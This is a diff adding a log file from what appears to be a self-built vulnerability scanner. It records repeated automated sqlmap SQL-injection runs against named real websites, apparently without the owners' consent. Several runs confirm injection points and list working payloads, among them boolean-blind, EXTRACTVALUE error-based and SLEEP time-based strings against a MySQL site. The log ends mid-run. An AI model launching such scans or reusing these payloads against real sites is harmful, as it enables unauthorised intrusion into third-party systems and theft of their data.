@@ -1,0 +1,426 @@
+-------------------------------------
+2018-12-05:16:21:25   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/CompVisualizeBig.asp?id=88 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:21:27           ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:21:26 /2018-12-05/
+
+[16:21:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.02' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:21:26] [INFO] resuming back-end DBMS 'microsoft access' 
+[16:21:26] [INFO] testing connection to the target URL
+[16:21:27] [INFO] heuristics detected web page charset 'ISO-8859-2'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=88 AND 6446=6446
+---
+[16:21:27] [INFO] the back-end DBMS is Microsoft Access
+web server operating system: Windows
+web application technology: ASP
+back-end DBMS: Microsoft Access
+[16:21:27] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.zz689.com'
+
+[*] ending @ 16:21:27 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:22:02   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/shownews.asp?id=246 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:22:12           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:22:03 /2018-12-05/
+
+[16:22:03] [INFO] fetched random HTTP User-Agent header value 'Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:22:03] [INFO] testing connection to the target URL
+[16:22:04] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:22:04] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:22:04] [INFO] testing if the target URL content is stable
+[16:22:05] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[16:22:05] [INFO] testing if GET parameter 'id' is dynamic
+[16:22:05] [INFO] heuristics detected web page charset 'GB2312'
+[16:22:05] [INFO] GET parameter 'id' appears to be dynamic
+[16:22:06] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[16:22:06] [INFO] testing for SQL injection on GET parameter 'id'
+[16:22:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:22:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:22:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:22:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:22:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:22:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:22:07] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:22:07] [INFO] testing 'MySQL inline queries'
+[16:22:07] [INFO] testing 'PostgreSQL inline queries'
+[16:22:07] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:22:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:22:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:22:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:22:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:22:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:22:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:22:09] [INFO] testing 'Oracle AND time-based blind'
+[16:22:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:22:09] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[16:22:12] [WARNING] GET parameter 'id' does not seem to be injectable
+[16:22:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:22:12 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:22:24   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/shownews.asp?id=247 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:22:36   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/shownews.asp?id=65 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:22:46           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:22:37 /2018-12-05/
+
+[16:22:37] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:22:38] [INFO] testing connection to the target URL
+[16:22:38] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:22:38] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:22:38] [INFO] testing if the target URL content is stable
+[16:22:39] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[16:22:39] [INFO] testing if GET parameter 'id' is dynamic
+[16:22:39] [INFO] heuristics detected web page charset 'GB2312'
+[16:22:39] [INFO] GET parameter 'id' appears to be dynamic
+[16:22:40] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[16:22:40] [INFO] testing for SQL injection on GET parameter 'id'
+[16:22:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:22:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:22:41] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:22:41] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:22:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:22:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:22:41] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:22:42] [INFO] testing 'MySQL inline queries'
+[16:22:42] [INFO] testing 'PostgreSQL inline queries'
+[16:22:42] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:22:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:22:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:22:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:22:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:22:42] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:22:43] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:22:43] [INFO] testing 'Oracle AND time-based blind'
+[16:22:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:22:43] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[16:22:46] [WARNING] GET parameter 'id' does not seem to be injectable
+[16:22:46] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:22:46 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:22:56   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/About.asp?Title=搴嗗吀浼氬睍鏈嶅姟 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:23:09           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:22:57 /2018-12-05/
+
+[16:22:57] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412.6 (KHTML, like Gecko)' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:22:57] [INFO] testing connection to the target URL
+[16:22:58] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:22:58] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:22:58] [INFO] testing if the target URL content is stable
+[16:22:58] [INFO] target URL content is stable
+[16:22:58] [INFO] testing if GET parameter 'Title' is dynamic
+[16:22:59] [WARNING] GET parameter 'Title' does not appear to be dynamic
+[16:22:59] [INFO] heuristics detected web page charset 'GB2312'
+[16:22:59] [WARNING] heuristic (basic) test shows that GET parameter 'Title' might not be injectable
+[16:22:59] [INFO] testing for SQL injection on GET parameter 'Title'
+[16:22:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:23:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:23:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:23:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:23:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:23:00] [WARNING] if you experience problems with non-ASCII identifier names you are advised to rerun with '--tamper=charunicodeencode'
+[16:23:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:23:01] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:23:01] [INFO] testing 'MySQL inline queries'
+[16:23:01] [INFO] testing 'PostgreSQL inline queries'
+[16:23:01] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:23:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:23:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:23:02] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:23:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:23:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:23:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:23:03] [INFO] testing 'Oracle AND time-based blind'
+[16:23:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:23:05] [WARNING] reflective value(s) found and filtering out
+[16:23:09] [WARNING] GET parameter 'Title' does not seem to be injectable
+[16:23:09] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:23:09 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:23:30   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/shownews.asp?id=246 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:23:45           ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [']     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:23:31 /2018-12-05/
+
+[16:23:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en_CA) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:23:32] [INFO] testing connection to the target URL
+[16:23:33] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:23:33] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:23:33] [INFO] testing if the target URL content is stable
+[16:23:33] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[16:23:33] [INFO] testing if GET parameter 'id' is dynamic
+[16:23:34] [INFO] heuristics detected web page charset 'GB2312'
+[16:23:34] [INFO] GET parameter 'id' appears to be dynamic
+[16:23:34] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[16:23:34] [INFO] testing for SQL injection on GET parameter 'id'
+[16:23:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:23:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:23:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:23:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:23:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:23:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:23:36] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:23:36] [INFO] testing 'MySQL inline queries'
+[16:23:36] [INFO] testing 'PostgreSQL inline queries'
+[16:23:36] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:23:36] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:23:37] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:23:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:23:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:23:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:23:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:23:39] [INFO] testing 'Oracle AND time-based blind'
+[16:23:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:23:39] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[16:23:45] [WARNING] GET parameter 'id' does not seem to be injectable
+[16:23:45] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:23:45 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:23:55   [WARNING ERROR]HTTPConnectionPool(host='www.zz689.com', port=80): Max retries exceeded with url: /shownews.asp?id=247 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000004E0F518>, 'Connection to www.zz689.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-05:16:24:03   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/shownews.asp?id=238 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:24:14           ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:24:04 /2018-12-05/
+
+[16:24:04] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:24:04] [INFO] testing connection to the target URL
+[16:24:05] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:24:05] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:24:05] [INFO] testing if the target URL content is stable
+[16:24:06] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[16:24:06] [INFO] testing if GET parameter 'id' is dynamic
+[16:24:06] [INFO] heuristics detected web page charset 'GB2312'
+[16:24:06] [INFO] GET parameter 'id' appears to be dynamic
+[16:24:07] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[16:24:07] [INFO] testing for SQL injection on GET parameter 'id'
+[16:24:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:24:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:24:07] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:24:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:24:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:24:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:24:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:24:08] [INFO] testing 'MySQL inline queries'
+[16:24:08] [INFO] testing 'PostgreSQL inline queries'
+[16:24:08] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:24:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:24:09] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:24:09] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:24:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:24:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:24:10] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:24:11] [INFO] testing 'Oracle AND time-based blind'
+[16:24:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:24:11] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
+[16:24:14] [WARNING] GET parameter 'id' does not seem to be injectable
+[16:24:14] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:24:14 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:35:02   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://www.zz689.com/About.asp?Title=濠氬簡鏈嶅姟 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:35:14           ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:35:03 /2018-12-05/
+
+[16:35:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:35:03] [INFO] testing connection to the target URL
+[16:35:04] [INFO] heuristics detected web page charset 'ISO-8859-2'
+[16:35:04] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[16:35:04] [INFO] testing if the target URL content is stable
+[16:35:05] [INFO] target URL content is stable
+[16:35:05] [INFO] testing if GET parameter 'Title' is dynamic
+[16:35:05] [WARNING] GET parameter 'Title' does not appear to be dynamic
+[16:35:05] [INFO] heuristics detected web page charset 'GB2312'
+[16:35:05] [WARNING] heuristic (basic) test shows that GET parameter 'Title' might not be injectable
+[16:35:05] [INFO] testing for SQL injection on GET parameter 'Title'
+[16:35:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:35:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:35:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:35:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:35:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:35:07] [WARNING] if you experience problems with non-ASCII identifier names you are advised to rerun with '--tamper=charunicodeencode'
+[16:35:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:35:07] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:35:07] [INFO] testing 'MySQL inline queries'
+[16:35:07] [INFO] testing 'PostgreSQL inline queries'
+[16:35:07] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:35:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:35:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:35:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:35:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:35:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:35:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:35:09] [INFO] testing 'Oracle AND time-based blind'
+[16:35:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:35:10] [WARNING] reflective value(s) found and filtering out
+[16:35:14] [WARNING] GET parameter 'Title' does not seem to be injectable
+[16:35:14] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 16:35:14 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:37:30   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://xy.5971.com/game?id=298 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:37:32           ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:37:30 /2018-12-05/
+
+[16:37:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.97\lib\sqlmap\txt\user-agents.txt'
+[16:37:31] [INFO] resuming back-end DBMS 'mysql' 
+[16:37:31] [INFO] testing connection to the target URL
+[16:37:31] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25) AND 4650=4650 AND (2449=2449
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=25) AND EXTRACTVALUE(1840,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(1840=1840,1))),0x7178767671)) AND (5924=5924
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25) AND SLEEP(5) AND (4082=4082
+---
+[16:37:31] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty, PHP 7.0.23
+back-end DBMS: MySQL >= 5.1
+[16:37:31] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\xy.5971.com'
+
+[*] ending @ 16:37:31 /2018-12-05/
+
+
+-------------------------------------
+2018-12-05:16:38:53   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.97\lib\sqlmap\sqlmap.py -u http://xy.5971.com/game?id=93 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-05:16:38:55           ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
